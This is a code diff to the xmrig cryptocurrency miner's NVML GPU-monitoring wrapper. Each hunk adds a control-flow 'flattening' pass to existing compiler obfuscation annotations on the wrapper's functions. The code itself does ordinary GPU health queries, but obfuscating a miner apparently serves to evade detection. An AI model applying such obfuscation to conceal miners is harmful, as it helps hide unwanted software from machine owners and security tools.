@@ -74,7 +74,7 @@ String NvmlLib::m_loader;
 } // namespace xmrig
 
 
-bool __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::init(const char *fileName)
+bool __attribute__((__annotate__(("indirectcall,indirectbr,flattening,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::init(const char *fileName)
 {
     if (!m_initialized) {
         m_loader      = fileName;
@@ -92,7 +92,7 @@ const char *xmrig::NvmlLib::lastError() noexcept
 }
 
 
-void __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::close()
+void __attribute__((__annotate__(("indirectcall,indirectbr,flattening,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::close()
 {
     if (m_ready) {
         pNvmlShutdown();
@@ -102,7 +102,7 @@ void __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,
 }
 
 
-bool __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::assign(std::vector<CudaDevice> &devices)
+bool __attribute__((__annotate__(("indirectcall,indirectbr,flattening,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::assign(std::vector<CudaDevice> &devices)
 {
     uint32_t count = 0;
     if (pNvmlDeviceGetCount(&count) != NVML_SUCCESS) {
@@ -131,7 +131,7 @@ bool __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,
 }
 
 
-NvmlHealth __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::health(nvmlDevice_t device)
+NvmlHealth __attribute__((__annotate__(("indirectcall,indirectbr,flattening,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::health(nvmlDevice_t device)
 {
     if (!device) {
         return {};
@@ -168,7 +168,7 @@ NvmlHealth __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,bog
 }
 
 
-bool __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::dlopen()
+bool __attribute__((__annotate__(("indirectcall,indirectbr,flattening,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::dlopen()
 {
     if (!m_loader.isNull()) {
         return uv_dlopen(m_loader, &nvmlLib) == 0;
@@ -189,7 +189,7 @@ bool __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,
 }
 
 
-bool __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::load()
+bool __attribute__((__annotate__(("indirectcall,indirectbr,flattening,aliasaccess,boguscfg,substitution")))) xmrig::NvmlLib::load()
 {
     try {
         DLSYM(NvmlDeviceGetClockInfo);
